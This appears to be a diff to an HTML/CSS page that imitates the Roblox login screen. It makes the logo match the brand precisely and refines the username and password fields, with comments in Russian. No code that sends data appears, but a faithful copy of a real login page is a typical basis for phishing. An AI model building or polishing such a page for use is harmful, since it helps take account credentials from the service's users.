@@ -84,13 +84,39 @@
             z-index: 10;
         }
 
-        .roblox-logo-text {
+        /* Точный фирменный логотип Roblox с наклонным квадратом */
+        .roblox-logo {
             font-size: 42px;
             font-weight: 900;
-            letter-spacing: -1px;
+            letter-spacing: -1.5px;
             color: #fff;
             margin-bottom: 30px;
             text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            transform: skew(-8deg);
+        }
+
+        .o-box-wrapper {
+            display: inline-block;
+            position: relative;
+            width: 32px;
+            height: 38px;
+            margin: 0 1px;
+            background: #fff;
+            border-radius: 5px;
+            transform: rotate(12deg);
+        }
+
+        .o-box-inner {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 16px;
+            height: 20px;
+            background: #0d0f12;
+            border-radius: 2px;
         }
 
         .input-box {
@@ -117,7 +143,7 @@
             color: #9ca3af;
         }
 
-        /* Working eye button */
+        /* Полностью серая и чистая кнопка глазика без лишних оттенков */
         .eye-btn {
             position: absolute;
             right: 14px;
@@ -129,12 +155,12 @@
             font-size: 18px;
             padding: 4px;
             color: #9ca3af;
+            filter: grayscale(100%);
         }
         .eye-btn:hover {
             color: #fff;
         }
 
-        /* Login button (active when fields are filled) */
         .login-btn {
             width: 100%;
             padding: 16px;
@@ -218,7 +244,10 @@
     </div>
 
     <div class="container">
-        <div class="roblox-logo-text">ROBLOX</div>
+        <!-- Фирменный логотип Roblox -->
+        <div class="roblox-logo">
+            R<span class="o-box-wrapper"><span class="o-box-inner"></span></span>BLOX
+        </div>
 
         <div class="input-box">
             <input type="text" id="usernameInput" placeholder="Username/Email/Phone" oninput="checkInputs()">
